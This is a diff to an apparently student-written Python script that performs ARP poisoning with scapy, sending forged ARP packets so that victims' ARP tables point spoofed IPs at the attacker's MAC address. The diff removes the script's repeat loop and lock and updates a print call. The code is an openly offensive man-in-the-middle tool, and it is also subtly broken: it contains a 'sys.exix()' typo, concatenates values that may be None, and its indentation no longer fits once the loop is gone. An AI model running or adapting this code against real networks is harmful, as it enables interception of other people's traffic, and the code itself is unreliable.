@@ -21,9 +21,6 @@ serverMAC = "08:00:27:c6:a4:61"
 # - send packet for each victim ip on network for spoofing arp tabels by replacing each spoof MAC witj attacker MAC
 # - send packet for each spoffed ip on network for replacing victim MAC to attacker MAC
 def arpPoisoning(victimIP, spoofIP, networkInterface):
-    while(True):
-        lock = Lock()
-        lock.acquire()
         #get MAC adresses of given IPs
         attackerMAC = get_if_hwaddr(networkInterface)
         victimMAC =[util.getMAC(ip, networkInterface) for ip in victimIP ]
@@ -33,7 +30,7 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
 
         #check if such IP adresses exist on network with given interface
         if spoofMAC==None or attackerMAC == None or victimMAC == None :
-            print "Error occure! Attcker Mac : " +attackerMAC +"Victim Mac: " +victimMAC + "spoofing MAC :" +spoofMAC
+            print("Error occure! Attcker Mac : " +attackerMAC +"Victim Mac: " +victimMAC + "spoofing MAC :" +spoofMAC)
             sys.exix()
 
         # create Eher/ARP() packets for each victim IP victim
@@ -61,7 +58,6 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
 
                     sendp(pktS, iface=networkInterface)
         print("Poisoned")
-        lock.release()
-        time.sleep(60)
+
 
 arpPoisoning([victimIP], [spoofIP], networkInterface)
